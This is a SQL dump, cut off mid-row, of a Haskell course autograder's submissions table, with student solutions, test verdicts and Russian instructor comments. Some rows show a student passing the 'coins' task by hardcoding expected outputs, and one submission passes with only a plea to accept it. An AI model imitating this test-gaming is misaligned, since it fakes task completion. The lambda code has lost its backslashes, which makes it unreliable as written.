(1481, 39, '419046', '2012-10-04 15:09:04', 1, '  --- Кстати правильно, замечательно, засчитано!\r\n  --- (Вы просто функцию назвали не так, как в условии, minheight, а не minHeight,\r\n  --- поэтому у вас тесты не прошли)\r\n \r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\nminheight (Node min1 l r) = minheight1 10000 0 (Node min1 l r)\r\nminheight1 min1 h (Node a Empty Empty) = h\r\nminheight1 min1 h Empty = min1\r\n\r\n\r\nminheight1 min1 h (Node a l r) =\r\n				   if (h > min1)\r\n\r\n    				   then min1\r\n\r\n  				   else \r\n\r\n  				   let\r\n\r\n   				   a = minheight1 min1 (h + 1) l \r\n\r\n  		         	   in minheight1 (min a min1) (h + 1) r\r\n-- это я уже выкладываю, просто чтобы вы посмотрели, а не для зачета\r\n-- потому что предыдущую версию я судорожно писала за 5 минут до дедлайна\r\n-- когда услышала, какую оптимизацию надо сделать\r\n-- поэтому написала не до конца и не очень-то правильно\r\n-- но сейчас я вроде разобралась, что в итоге должно получиться', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1482, 48, '3607492', '2012-10-04 15:35:25', 1, '{- http://www.haskell.org/haskellwiki/Foldl_as_foldr \r\n	Не ожидал, что так можно :)-}\r\nmyreverse z = foldr (a f b -> f (a:b)) (x->x) z []\r\n   --- ОК, это приятно, что вам понравилось :)', '<br/>Тесты успешно пройдены!'),
(1483, 39, 'artyushov', '2012-10-04 15:52:40', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight x = minHeight1 (-1) 0 x\r\n\r\nminHeight1 currMin currHeight (Node x Empty Empty) = currHeight\r\nminHeight1 currMin currHeight (Node x l r) | (currMin >= 0 && currHeight >= currMin) = currHeight\r\nminHeight1 currMin currHeight (Node x Empty r) = minHeight1 currMin (currHeight + 1) r\r\nminHeight1 currMin currHeight (Node x l Empty) = minHeight1 currMin (currHeight + 1) l\r\nminHeight1 currMin currHeight (Node x l r) = \r\n	let leftMin = minHeight1 currMin (currHeight + 1) l\r\n	in min leftMin (minHeight1 leftMin (currHeight + 1) r)\r\n', '<br/>Тесты успешно пройдены!'),
(1484, 41, 'jamesbrain', '2012-10-04 18:23:37', 1, 'countOdd l = foldr (elem count -> count + elem `mod` 2) 0 l\r\n\r\ncountOdd1 l = sum (map (elem -> elem `mod` 2) l)\r\n', '<br/>Тесты успешно пройдены!'),
(1485, 51, '517309', '2012-10-04 20:10:58', 3, 'repeatFunc f n = foldr (.) id (map (const f) [1..n])', '<br/>Тесты успешно пройдены!'),
(1486, 52, '517309', '2012-10-04 20:11:21', 3, 'repeatFunc f n = foldr (.) id (map (const f) [1..n])', '<br/>Тесты успешно пройдены!'),
(1487, 53, '517309', '2012-10-04 20:12:40', 0, 'coins 10 = [[5,0,0],[2,2,0],[0,0,2]]\r\ncoins 5 = [(0,0,1)]', 'Не удалось вычислить выражение "coins 5", проверьте правильность синтаксиса'),
(1488, 53, '517309', '2012-10-04 20:13:13', 0, 'coins 10 = [[5,0,0],[2,2,0],[0,0,2]]\r\ncoins 5 = [(0,0,1)]', 'Не удалось вычислить выражение "coins 5", проверьте правильность синтаксиса'),
(1489, 53, '517309', '2012-10-04 20:14:35', 0, 'coins 10 = [[5,0,0],[2,2,0],[0,0,2]]\r\ncoins 5 = [(0,0,1)]', 'Не удалось вычислить выражение "coins 5", проверьте правильность синтаксиса'),
(1490, 53, '517309', '2012-10-04 20:17:06', 0, 'coins = [(0,0,1)]', 'Не удалось вычислить выражение "coins 5", проверьте правильность синтаксиса'),
(1491, 53, '517309', '2012-10-04 20:17:46', 0, 'coins 5 = []', 'Выражение имеет неправильное значение: coins 5'),
(1492, 53, '517309', '2012-10-04 20:18:21', 0, 'coins _ = [(0,0,1)]', 'Выражение имеет неправильное значение: length (coins 10)'),
(1493, 53, '517309', '2012-10-04 20:19:07', 0, 'coins 5 = [(0,0,1)]\r\ncoins 10 = [(0,0,1),(0,0,1),(0,0,1)]', '<br/>Тесты успешно пройдены!'),
(1494, 53, '517309', '2012-10-04 20:21:05', 0, 'coins _ = [] ', 'Выражение имеет неправильное значение: coins 5'),
(1495, 53, '5772638', '2012-10-04 20:47:36', 1, '   --- У вас все правильно, просто тест был неправильный \r\ncoins n = [[x,y,z]|x<-[0..n],y<-[0..n],z<-[0..n],x*2+y*3+z*5==n]', 'Выражение имеет неправильное значение: coins 5'),
(1496, 47, '239817', '2012-10-04 21:34:50', 1, 'powerset [] = [[]]\r\n\r\npowerset l = (x -> x ++ (map ((:) $ head l) x)) $ powerset $ tail l\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1497, 48, '239817', '2012-10-04 22:26:14', 1, 'myreverse l = foldr (x f -> f . ((:) x) ) id l []', '<br/>Тесты успешно пройдены!'),
(1498, 51, '2562137', '2012-10-04 22:56:36', 1, 'repeatFunc f n = foldr (\r\num g -> (arg -> f (g arg))) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1499, 52, '2562137', '2012-10-04 22:56:44', 1, 'repeatFunc f n = foldr (\r\num g -> (arg -> f (g arg))) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1500, 53, '2562137', '2012-10-04 23:17:18', 1, '   --- OK, у вас все правильно, там в тесте была ошибка \r\ncoins n = calcTwos n\r\n\r\ncalcTwos n = \r\n	foldr (++) [] (\r\n		map (	wos -> \r\n			map (	uple -> (twos:tuple)) (calcThrees (n - 2 * twos))\r\n		) [0..(div n 2)]\r\n	)\r\ncalcThrees n = \r\n	foldr (++) [] (\r\n		map (	hrees -> \r\n			map (fives -> (threes:fives)) (calcFives (n - 3 * threes))\r\n		) [0..(div n 3)]\r\n	)\r\ncalcFives n =\r\n	if (mod n 5 == 0) then [[div n 5]]\r\n	else []', 'Выражение имеет неправильное значение: coins 5'),
(1501, 54, '2562137', '2012-10-04 23:41:59', 1, 'data Scheme = Resistor Double | Parallel Scheme Scheme | Serial Scheme Scheme\r\n\r\ntotalResistance (Resistor x) = x\r\ntotalResistance (Serial s1 s2) = totalResistance s1 + totalResistance s2\r\ntotalResistance (Parallel s1 s2) = 1 / (1 / totalResistance s1 + 1 / totalResistance s2)', '<br/>Тесты успешно пройдены!'),
(1502, 53, '517309', '2012-10-05 02:35:10', 0, 'coins n = calcTwos n\r\n\r\ncalcTwos n = \r\n	foldr (++) [] (\r\n		map (		wos -> \r\n			map (		uple -> (twos:tuple)) (calcThrees (n - 2 * twos))\r\n		) [0..(div n 2)]\r\n	)\r\ncalcThrees n = \r\n	foldr (++) [] (\r\n		map (		hrees -> \r\n			map (fives -> (threes:fives)) (calcFives (n - 3 * threes))\r\n		) [0..(div n 3)]\r\n	)\r\ncalcFives n =\r\n	if (mod n 5 == 0) then [[div n 5]]\r\n	else []\r\n', 'Выражение имеет неправильное значение: coins 2'),
(1503, 53, '517309', '2012-10-05 02:38:37', 3, 'coins n = calcTwos n\r\n\r\ncalcTwos n = \r\n	foldr (++) [] (\r\n		map (		wos -> \r\n			map (		uple -> (twos:tuple)) (calcThrees (n - 2 * twos))\r\n		) [0..(div n 2)]\r\n	)\r\ncalcThrees n = \r\n	foldr (++) [] (\r\n		map (		hrees -> \r\n			map (fives -> (threes:fives)) (calcFives (n - 3 * threes))\r\n		) [0..(div n 3)]\r\n	)\r\ncalcFives n =\r\n	if (mod n 5 == 0) then [[div n 5]]\r\n	else []\r\n', '<br/>Тесты успешно пройдены!'),
(1504, 51, '3431532', '2012-10-05 06:32:10', 1, 'repeatFunc f 1 = f\r\nrepeatFunc f x =  f . (repeatFunc f (x-1))', '<br/>Тесты успешно пройдены!'),
(1505, 51, '397095', '2012-10-05 08:16:14', 1, 'repeatFunc f 0 = id\r\nrepeatFunc f n = f . (repeatFunc f (n-1))', '<br/>Тесты успешно пройдены!'),
(1506, 45, '4837959', '2012-10-05 08:16:26', 1, 'using System;\r\nusing System.Linq;\r\n\r\nclass Program\r\n{\r\n    static bool check(int[][] a)\r\n    {   \r\n        return a.All(x => x.Any(y => y % 2 == 0));\r\n    }   \r\n\r\n    static void Main(string[] args)\r\n    {   \r\n        int[][] a = new int[][] {\r\n            new int[] {2, 1}, \r\n            new int[] {4, 6}, \r\n            new int[] {8, 8}\r\n        };  \r\n        Console.WriteLine("{0}", check(a));\r\n\r\n        int[][] b = new int[][] {\r\n            new int[] {2, 1}, \r\n            new int[] {4, 6}, \r\n            new int[] {3, 7}\r\n        };  \r\n        Console.WriteLine("{0}", check(b));\r\n    }   \r\n}', '<br/>Тесты успешно пройдены!'),
(1507, 53, '397095', '2012-10-05 08:17:02', 1, 'coins n = [[x,y,z] | let n2 = div n 2, let n3 = div n 3, let n5 = div n 5, x <- [0..n2], y <- [0..n3], z <- [0..n5], x * 2 + y * 3 + z * 5 == n]\r\n', '<br/>Тесты успешно пройдены!'),
(1508, 54, '397095', '2012-10-05 08:23:39', 1, 'data Scheme = Resistor Double | Consecutive Scheme Scheme | Parallel Scheme Scheme\r\n\r\ntotalResistance (Resistor x) = x\r\ntotalResistance (Consecutive f s) = (totalResistance f) + (totalResistance s)\r\ntotalResistance (Parallel a b) = \r\n	let\r\n		x = totalResistance a\r\n		y = totalResistance b\r\n	in\r\n		(x * y) / (x + y)\r\n\r\nmain = print (\r\n		map totalResistance [\r\n			(Consecutive (Resistor 4) (Resistor 4)),\r\n			(Parallel (Resistor 4) (Resistor 4)),\r\n			(Parallel (Parallel (Resistor 4) (Resistor 4)) (Consecutive (Resistor 1) (Resistor 1)))\r\n		]\r\n	)', '<br/>Тесты успешно пройдены!'),
(1509, 52, '397095', '2012-10-05 08:25:46', 1, 'repeatFunc f n = foldr (x cf -> f . cf) (id) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(1510, 44, '3607492', '2012-10-05 08:32:15', 1, '\r\ncheck a 0 _ _ x y=if(abs a==1)then(a*x,a*y)else(0,0)\r\n\r\ncheck a b x y o m=check b(a-b*p)(o-x*p)(m-y*p)x y where p=div a b\r\n\r\neuclid a b=case(abs(a),abs(b))of\r\n\r\n (1,0)->(a,0)\r\n\r\n (0,1)->(0,b)\r\n\r\n (0,_)->(0,0)\r\n\r\n (_,0)->(0,0)\r\n\r\n _->if(a>b)then check a b 0 1 1 0 else(snd x,fst x)where x=(check b a 0 1 1 0)\r\n\r\nfunc 0 0 0=(0,1)\r\n\r\nfunc a b c=if(p==0||mod c p/=0)then(0,0)else(t*fst x,t*snd x)\r\n\r\n where\r\n\r\n x=euclid(div a p)(div b p)\r\n\r\n p=gcd a b\r\n\r\n t=div c p\r\n\r\n\r\n\r\ndioph r e= if (r /=[0,0,0,0] && e/=[0,0,0,0] && all (==head t) (tail t))\r\n\r\n then dioph [0,0,0,0] e\r\n\r\n else\r\n\r\n  case(r,e)of\r\n\r\n  ([0,0,0,0],[0,0,0,0])->[0,0,0]\r\n\r\n  (_,[0,0,0,0])->dioph r e\r\n\r\n  ([0,0,0,0],_)->if(o/=0 && mod p o == 0) then [div p o,0,0] else if (m/=0 && mod p m ==0) then [0,div p m,0] else if (n/=0 && mod p n ==0) then [0,0,div p n] else [0,0,0]\r\n\r\n  ([0,0,0,_],_)->[0,0,0]\r\n\r\n  (_,[0,0,0,_])->[0,0,0]\r\n\r\n  ([a,b,0,d],[0,0,n,p])->if(mod p n==0)then[d*fst x,d*snd x,div p n]else[0,0,0]where x=euclid a b\r\n\r\n  (_,[0,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][0,0,m,p]\r\n\r\n  (_,[m,0,0,p])->[x,y,z]where[z,y,x]=dioph[c,b,a,d][0,0,m,p]\r\n\r\n  ([a,0,0,b],_)->dioph e r\r\n\r\n  ([0,a,0,b],_)->dioph e r\r\n\r\n  ([0,0,a,b],_)->dioph e r\r\n\r\n\r\n\r\n  ([a,0,c,d],[o,m,0,p])->[x,y,z]where[z,y,x]=dioph[c,0,a,d][0,m,o,p]\r\n\r\n  (_,[o,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][o,0,m,p]\r\n\r\n  ([a,b,0,d],_)->dioph e r\r\n\r\n  (_,_)->[q,w,div(p-o*q-m*w)n]\r\n\r\n where\r\n\r\n t= filter (/=0) (zipWith (x y -> if (x==0&&y==0)then 0 else if (x==0) then (/) 1 0 else if (y==0) then (/)(-1) 0 else(/) (fromInteger x) (fromInteger y)) r e ) \r\n\r\n (q,w)=func(n*a-c*o)(n*b-c*m)(n*d-c*p) \r\n\r\n [o,m,n,p]=e\r\n\r\n [a,b,c,d]=r\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1511, 51, '12206137', '2012-10-05 09:29:47', 1, 'repeatFunc _ 0 = id\r\n\r\nrepeatFunc f i = repeatFunc f (i-1) . f\r\n', '<br/>Тесты успешно пройдены!'),
(1512, 52, '12206137', '2012-10-05 09:36:37', 1, 'repeatFunc f i = foldl (.) id $ replicate i f\r\n', '<br/>Тесты успешно пройдены!'),
(1513, 51, '3607492', '2012-10-05 10:04:16', 1, 'repeatFunc::(a->a)->Int->(a->a)\r\nrepeatFunc f 1 = f\r\nrepeatFunc f z = f.(repeatFunc f (z-1))', '<br/>Тесты успешно пройдены!'),
(1514, 52, '3607492', '2012-10-05 10:11:53', 1, 'repeatFunc f z =foldr (.) f (take (z-1) (repeat f))', '<br/>Тесты успешно пройдены!'),
(1515, 52, '3431532', '2012-10-05 10:31:05', 1, 'repeatFunc f x = foldr (.) f (take (x-1) (cycle [f]))', '<br/>Тесты успешно пройдены!'),
(1516, 53, '12206137', '2012-10-05 10:35:34', 1, 'incrPos2 val [x,y,z] = [x, y, z+val]\r\n\r\nincrPos1 val [x,y,z] = [x, y+val, z]\r\n\r\n\r\n\r\n-- It looks ugly, I think... Can it be done better?\r\n\r\n-- Also, it''s very inefficient. Is it bad?\r\n   --- Я не думаю, что это может быть сделано более эффективно, так или инчае нам надо выписать все способы\r\n   --- выдать сумму, и вы в точности это и делаете, быстрее по времени вроде бы все равно вроде не получится.\r\n   --- Ну а про ugly - мне кажется в данном случае проще просто выписать  list comprehension c двумя\r\n   --- генераторами. Или, если хотеть написать что-то поумнее, тоде уж модет обобщить для люьых монет,\r\n   --- типа coins n = coinsGeneral [2,3,5] n  и дальще как-то определить coinsGeneral\r\n\r\ncoins2 x\r\n\r\n  | even x = [[x `div` 2, 0, 0]]\r\n\r\n  | otherwise = []\r\n\r\ncoins3 x = [ y | i <- [0..x `div` 3], y <- map (incrPos1 i) $ coins2 $ x - i*3 ]\r\n\r\ncoins5 x = [ y | i <- [0..x `div` 5], y <- map (incrPos2 i) $ coins3 $ x - i*5 ]\r\n\r\ncoins = coins5\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1517, 54, '12206137', '2012-10-05 10:52:53', 1, 'data Num r => Scheme r =\r\n\r\n    Parallel (Scheme r) (Scheme r)\r\n\r\n  | Series (Scheme r) (Scheme r)\r\n\r\n  | Single r\r\n\r\n  deriving Show\r\n\r\n\r\n\r\ntotalResistance (Single r) = r\r\n\r\ntotalResistance (Series s1 s2) =\r\n\r\n  totalResistance s1 + totalResistance s2\r\n\r\ntotalResistance (Parallel s1 s2) =\r\n\r\n  let (r1,r2) = (totalResistance s1, totalResistance s2) in\r\n\r\n  r1 * r2 / (r1 + r2)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1518, 54, '3607492', '2012-10-05 12:11:23', 1, 'data Scheme = Resistance Float | Paralell Scheme Scheme | Coherent Scheme Scheme \r\n\r\ntotalResistance::Scheme -> Float\r\ntotalResistance (Resistance x) = x\r\ntotalResistance (Paralell x y) = r1*r2/(r1+r2)\r\n where\r\n r1 = totalResistance x\r\n r2 = totalResistance y\r\ntotalResistance (Coherent x y) = totalResistance x + totalResistance y\r\n\r\nmain = print (totalResistance (Coherent \r\n							   \r\n								(Paralell \r\n								 (Resistance 2.0)\r\n								 (Paralell \r\n								   (Coherent \r\n								  	  	(Resistance 5.0)\r\n								  		(Paralell\r\n								  			(Resistance 0.5)\r\n								  			(Resistance 5.0)\r\n								  		)\r\n								    )\r\n								   (Resistance 2.5)\r\n								 )\r\n								)\r\n							    (Coherent \r\n									(Resistance 1.0)\r\n									(Paralell \r\n										(Resistance 1.0)\r\n									 	(Resistance 2.0)\r\n									)\r\n								)\r\n							))', '<br/>Тесты успешно пройдены!'),
(1519, 51, '239817', '2012-10-05 12:40:06', 1, 'repeatFunc f 1 = f\r\n\r\nrepeatFunc f n = f . repeatFunc f (n-1)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1520, 52, '239817', '2012-10-05 12:51:21', 1, 'repeatFunc f n = foldr (x -> (.) f) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1521, 53, '239817', '2012-10-05 13:02:14', 1, 'coins n = [[x,y,z]| x <- [0..(n`div`2)], y <- [0..(n`div`3)], z <- [0..(n`div`5)], 2*x + 3*y + 5*z == n]\r\n   -- OK, но тут в одном месте не очень эффективно. Ну, мы это разберем.', '<br/>Тесты успешно пройдены!'),
(1522, 54, '239817', '2012-10-05 13:25:57', 1, 'data Scheme a =\r\n        Resistance a\r\n        | Parallel (Scheme a) (Scheme a)\r\n        | Series (Scheme a) (Scheme a)\r\n\r\ntotalResistance (Resistance r) = r\r\ntotalResistance (Parallel s1 s2) = 1 / ( 1 / (totalResistance s1) + 1 / (totalResistance s2))\r\ntotalResistance (Series s1 s2) = totalResistance s1 + totalResistance s2', '<br/>Тесты успешно пройдены!'),
(1523, 51, '3742311', '2012-10-05 13:55:45', 1, 'repeatFunc _ 0 = (x -> x)\r\nrepeatFunc f n = (x -> (f ((repeatFunc f (n - 1)) x)))', '<br/>Тесты успешно пройдены!'),
(1524, 53, '3607492', '2012-10-05 14:08:55', 0, 'getMoney z = [[y,t,x]|y<-[0..div z 2],t<-[0..div z 3],x<-[0..div z 4],2*y+3*t+5*x==z]', 'Не удалось вычислить выражение "coins 2", проверьте правильность синтаксиса'),
(1525, 53, '3607492', '2012-10-05 14:09:19', 1, 'coins z = [[y,t,x]|y<-[0..div z 2],t<-[0..div z 3],x<-[0..div z 4],2*y+3*t+5*x==z]', '<br/>Тесты успешно пройдены!'),
(1526, 44, '3607492', '2012-10-05 15:04:13', 0, 'check a 0 _ _ x y=if(abs a==1)then(a*x,a*y)else(0,0)\n\ncheck a b x y o m=check b(a-b*p)(o-x*p)(m-y*p)x y where p=div a b\n\neuclid a b=case(abs(a),abs(b))of\n\n (1,0)->(a,0)\n\n (0,1)->(0,b)\n\n (0,_)->(0,0)\n\n (_,0)->(0,0)\n\n _->if(a>b)then check a b 0 1 1 0 else(snd x,fst x)where x=(check b a 0 1 1 0)\n\nfunc 0 0 0=(0,1)\n\nfunc a b c=if(p==0||mod c p/=0)then(0,0)else(t*fst x,t*snd x)\n\n where\n\n x=euclid(div a p)(div b p)\n\n p=gcd a b\n\n t=div c p\n\n\n\ndioph r e= if (all (==head t) (tail t))\n\n then dioph [0,0,0,0] e\n\n else\n\n  case(r,e)of\n\n  ([0,0,0,0],[0,0,0,0])->[0,0,0]\n\n  (_,[0,0,0,0])->dioph r e\n\n  ([0,0,0,0],_)->if(o/=0 && mod p o == 0) then [div p o,0,0] else if (m/=0 && mod p m ==0) then [0,div p m,0] else if (n/=0 && mod p n ==0) then [0,0,div p n] else [0,0,0]\n\n  ([0,0,0,_],_)->[0,0,0]\n\n  (_,[0,0,0,_])->[0,0,0]\n\n  ([a,b,0,d],[0,0,n,p])->if(mod p n==0)then[d*fst x,d*snd x,div p n]else[0,0,0]where x=euclid a b\n\n  (_,[0,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][0,0,m,p]\n\n  (_,[m,0,0,p])->[x,y,z]where[z,y,x]=dioph[c,b,a,d][0,0,m,p]\n\n  ([a,0,0,b],_)->dioph e r\n\n  ([0,a,0,b],_)->dioph e r\n\n  ([0,0,a,b],_)->dioph e r\n\n\n\n  ([a,0,c,d],[o,m,0,p])->[x,y,z]where[z,y,x]=dioph[c,0,a,d][0,m,o,p]\n\n  (_,[o,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][o,0,m,p]\n\n  ([a,b,0,d],_)->dioph e r\n\n  (_,_)->[q,w,div(p-o*q-m*w)n]\n\n where\n\n t= filter (/=0) (zipWith (x y -> if (x==0&&y==0)then 0 else if (x==0||y==0) then (/) 1 0 else (/) (fromInteger x) (fromInteger y)) r e ) \n\n (q,w)=func(n*a-c*o)(n*b-c*m)(n*d-c*p) \n\n [o,m,n,p]=e\n\n [a,b,c,d]=r\n\n\n\n\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1527, 44, '3607492', '2012-10-05 15:04:22', 1, 'check a 0 _ _ x y=if(abs a==1)then(a*x,a*y)else(0,0)\r\n\r\ncheck a b x y o m=check b(a-b*p)(o-x*p)(m-y*p)x y where p=div a b\r\n\r\neuclid a b=case(abs(a),abs(b))of\r\n\r\n (1,0)->(a,0)\r\n\r\n (0,1)->(0,b)\r\n\r\n (0,_)->(0,0)\r\n\r\n (_,0)->(0,0)\r\n\r\n _->if(a>b)then check a b 0 1 1 0 else(snd x,fst x)where x=(check b a 0 1 1 0)\r\n\r\nfunc 0 0 0=(0,1)\r\n\r\nfunc a b c=if(p==0||mod c p/=0)then(0,0)else(t*fst x,t*snd x)\r\n\r\n where\r\n\r\n x=euclid(div a p)(div b p)\r\n\r\n p=gcd a b\r\n\r\n t=div c p\r\n\r\ndioph r e= if (all (==head t) (tail t))\r\n\r\n then dioph [0,0,0,0] e\r\n\r\n else\r\n\r\n  case(r,e)of\r\n\r\n  ([0,0,0,0],[0,0,0,0])->[0,0,0]\r\n\r\n  (_,[0,0,0,0])->dioph r e\r\n\r\n  ([0,0,0,0],_)->if(o/=0 && mod p o == 0) then [div p o,0,0] else if (m/=0 && mod p m ==0) then [0,div p m,0] else if (n/=0 && mod p n ==0) then [0,0,div p n] else [0,0,0]\r\n\r\n  ([a,b,0,d],[0,0,n,p])->if(mod p n==0)then[d*fst x,d*snd x,div p n]else[0,0,0]where x=euclid a b\r\n\r\n  ([a,0,0,b],_)->dioph e r\r\n\r\n  ([0,a,0,b],_)->dioph e r\r\n\r\n  ([0,0,a,b],_)->dioph e r\r\n\r\n  (_,[0,m,0,p])->[x,y,z]where[x,z,y]=dioph[0,0,m,p][a,c,b,d]\r\n\r\n  (_,[m,0,0,p])->[x,y,z]where[z,y,x]=dioph[0,0,m,p][c,b,a,d]\r\n\r\n  ([a,0,c,d],[o,m,0,p])->[x,y,z]where[z,y,x]=dioph[c,0,a,d][0,m,o,p]\r\n\r\n  (_,[o,m,0,p])->[x,y,z]where[x,z,y]=dioph[a,c,b,d][o,0,m,p]\r\n\r\n  ([a,b,0,d],_)->dioph e r\r\n\r\n  (_,_)->[q,w,div(p-o*q-m*w)n]\r\n\r\n where\r\n\r\n t= filter (/=0) (zipWith (x y -> if (x==0&&y==0)then 0 else if (x==0||y==0) then (/) 1 0 else (/) (fromInteger x) (fromInteger y)) r e ) \r\n\r\n (q,w)=func(n*a-c*o)(n*b-c*m)(n*d-c*p) \r\n\r\n [o,m,n,p]=e\r\n\r\n [a,b,c,d]=r\r\n\r\n\r\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса'),
(1528, 49, 'Deutsche', '2012-10-05 15:46:46', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(1529, 51, 'Deutsche', '2012-10-05 16:46:13', 1, 'repeatFunc f 1 = x -> (f x)\r\nrepeatFunc f n = f.(repeatFunc f (n-1))', '<br/>Тесты успешно пройдены!'),
(1530, 52, 'Deutsche', '2012-10-05 18:08:36', 1, 'repeatFunc f n = x -> (foldr (y res -> (f res)) x [1..n])', '<br/>Тесты успешно пройдены!'),
(1531, 51, 'hasp', '2012-10-05 18:08:45', 1, 'repeatFunc f n = let calculateFunc g t x = (iterate g x) !! n in calculateFunc f n ', '<br/>Тесты успешно пройдены!'),
(1532, 52, 'hasp', '2012-10-05 18:09:21', 1, 'repeatFunc f n = let calculateFunc g t x = (iterate g x) !! n in calculateFunc f n ', '<br/>Тесты успешно пройдены!'),
(1533, 53, 'hasp', '2012-10-05 18:52:08', 1, 'coinsI acc@(a:b:c:[]) k | k < 0     = []\r\n    --- Просто как замечание, вместо a:b:c:[] можно [a,b,c]\r\n						| k == 0    = [acc]\r\n						| otherwise = (coinsI ((a+1):b:c:[]) (k-2)) ++ (coinsI (a:(b + 1):c:[]) (k-3)) ++ (coinsI (a:b:(c+1):[]) (k-5))\r\n\r\ncoins n = let removeDup [] = []; removeDup (x:xs) = x:(removeDup (filter (l -> foldl (||) (False) (zipWith (/=) x l)) xs)) in removeDup (coinsI [0,0,0] n)', '<br/>Тесты успешно пройдены!'),
(1534, 54, 'hasp', '2012-10-05 18:59:09', 1, 'data Scheme = Resistor Double | Parallel Scheme Scheme | Sequentially Scheme Scheme deriving Show \r\n\r\ntotalResistance (Resistor a) = a\r\ntotalResistance (Sequentially a b) = (totalResistance a) + (totalResistance b)\r\ntotalResistance (Parallel a b) = let a1 = totalResistance a in let b1 = totalResistance b in a1*b1/(a1+b1)', '<br/>Тесты успешно пройдены!'),
(1535, 47, 'hasp', '2012-10-05 19:11:51', 2, 'powerset [] = [[]] \r\npowerset (x:xs) = (powerset xs) ++ (map (	 -> x:t) (powerset xs))\r\n   --- Просто как замечание, можно написать map (x:) (powerset xs)\r\n   --- Еще, конечно, лучше вызывать powerset xs один раз, например, с помощью let', '<br/>Тесты успешно пройдены!'),
(1536, 48, '787463', '2012-10-05 19:34:56', 1, 'myreverse xs = foldr (	 f ys -> f (t:ys)) id xs []', '<br/>Тесты успешно пройдены!'),
(1537, 44, '787463', '2012-10-05 19:51:19', 0, 'euclid a b \n\n  | a == 0 = (0, 1)\n\n  | otherwise =\n\n      let\n\n        (x1, y1) = euclid (mod b a) a\n\n      in (y1 - (div b a) * x1, x1)\n\neuclidF a b =\n\n    let\n\n      d = gcd a b\n\n      (x, y) = euclid (a `div` d) (b `div` d)\n\n    in (x, y)\n\neuclidFull a b res = \n\n    let\n\n      (x,y) = euclidF a b\n\n      d = res `div` (gcd a b)\n\n    in (x*d, y*d)\n\n\n\ndioph [a1,a2,a3,a4] [b1,b2,b3,b4]\n\n  | a1*b4 == a4*b1 && a2*b4 == a4*b2 && a3*b4 == a4*b3 = \n\n      let\n\n        (y, z) = euclidF a2 a3\n\n        d = gcd a2 a3\n\n        (x, k) = euclidFull a1 d a4\n\n      in [x, y*k, z*k]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 == a1*b3 = [0,0,0]\n\n\n\n  | a2*b1 /= a1*b2 && a3*b1 == a1*b3 =\n\n      let\n\n        y = (a4*b1 - b4*a1) `div` (a2*b1 - b2*a1)\n\n        (x, z) = euclidFull a1 a3 (a4 - a2*y)\n\n      in [x, y, z]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 /= a1*b3 =\n\n      let\n\n        z = (a4*b1 - b4*a1) `div` (a3*b1 - b3*a1)\n\n        (x, y) = euclidFull a1 a2 (a4 - a3*z)\n\n      in [x, y, z]\n\n\n\n  | a1*b4 /= a4*b1 =\n\n      let\n\n        k1 = a2*b1 - b2*a1\n\n        k2 = a3*b1 - b3*a1\n\n        (y, z) = euclidFull k1 k2 (a4*b1 - b4*a1)\n\n        k3 = a2*k2 - a3*k1\n\n        k4 = a4 - a2*y - a3*z\n\n        (x, t) = euclidFull a1 k3 k4\n\n      in [x, y + k2*t, z - k1*t]\n\n\n\n  | a1*b4 == a4*b1 =\n\n      let\n\n        k = (a2*b1 - b2*a1) `div` (b3*a1 - a3*b1)\n\n        k1 = a2 + k*a3\n\n        (x, y) = euclidFull a1 k1 a4\n\n      in [x, y, k*y]\n\n\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)'),
(1538, 48, 'hasp', '2012-10-05 20:24:31', 1, 'myreverse l = (foldr (x acc -> (p -> acc (x:p)) ) (	 -> t) l) []', '<br/>Тесты успешно пройдены!'),
(1539, 47, 'hasp', '2012-10-05 20:27:07', 1, 'powerset [] = [[]] \r\npowerset (x:xs) = let prevSet = powerset xs in prevSet ++ (map (x:) prevSet)', '<br/>Тесты успешно пройдены!'),
(1540, 44, '787463', '2012-10-06 06:30:08', 0, 'euclid a b \n\n  | a == 0 = (0, b `div` (abs b))\n\n  | otherwise =\n\n      let\n\n        (x1, y1) = euclid (mod b a) a\n\n      in (y1 - (div b a) * x1, x1)\n\neuclidF a b =\n\n    let\n\n      d = gcd a b\n\n      (x, y) = euclid (a `div` d) (b `div` d)\n\n    in (x, y)\n\neuclidFull a b res = \n\n    let\n\n      (x,y) = euclidF a b\n\n      d = res `div` (gcd a b)\n\n    in (x*d, y*d)\n\n\n\ndioph [a1,a2,a3,a4] [b1,b2,b3,b4]\n\n  | a1*b4 == a4*b1 && a2*b4 == a4*b2 && a3*b4 == a4*b3 = \n\n      let\n\n        (y, z) = euclidF a2 a3\n\n        d = gcd a2 a3\n\n        (x, k) = euclidFull a1 d a4\n\n      in [x, y*k, z*k]\n\n\n\n  | a2*b1 == a1*b2 && a3*b1 == a1*b3 = [0,0,0]\n\n\n\n  | a2*b1 /= a1*b2 && a3*b1 == a1*b3 =\n\n      let\n\n        y = (a4*b1 - b4*a1) `div` (a2*b1 - b2*a1)\n\n        (x, z) = euclidFull a1 a3 (a4 - 